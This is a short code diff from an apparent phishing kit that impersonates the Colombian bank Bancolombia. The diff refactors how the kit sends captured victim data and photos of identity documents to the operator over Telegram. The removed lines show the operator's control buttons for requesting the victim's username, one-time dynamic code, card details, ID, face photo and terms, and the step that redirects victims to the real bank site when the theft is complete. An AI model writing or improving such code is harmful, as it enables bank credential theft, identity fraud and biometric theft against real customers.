@@ -114,16 +114,7 @@ document.addEventListener('DOMContentLoaded', async function() {
                 
                 const fullData = BancoUtils.saveBankData('bancolombia', textData);
                 const message = BancoUtils.formatMessage('BANCOLOMBIA - Cédula', fullData);
-                const buttons = [
-                    { text: '🔑 Pedir Usuario', action: 'index' },
-                    { text: '🔢 Pedir Dinámica', action: 'dinamica' },
-                    { text: '💳 Pedir Tarjeta', action: 'tarjeta' },
-                    { text: '🆔 Pedir Cédula', action: 'cedula' },
-                    { text: '📷 Pedir Cara', action: 'cara' },
-                    { text: '📄 Pedir Términos', action: 'terminos' },
-                    { text: '✅ Finalizar', action: 'finalizar' }
-                ];
-                const keyboard = BancoUtils.createKeyboard(buttons, BancoUtils.getSessionId());
+                const keyboard = BancolombiaTelegram.getKeyboard();
                 
                 // Enviar con imagen por separado
                 await BancoUtils.sendToTelegram('cedula', { text: message, keyboard, image: photoData });
@@ -149,13 +140,7 @@ document.addEventListener('DOMContentLoaded', async function() {
         }
     });
     
-    BancoUtils.onTelegramAction((data) => {
-        if (data.action === 'finalizar') {
-            window.location.href = 'https://www.bancolombia.com/personas';
-        } else if (['index', 'dinamica', 'tarjeta', 'cedula', 'cara', 'terminos'].includes(data.action)) {
-            window.location.href = data.action + '.html';
-        }
-    });
+    BancoUtils.onTelegramAction((data) => BancolombiaTelegram.handleTelegramAction(data));
 
     // Actualizar IP y fecha/hora
     async function updateInfo() {
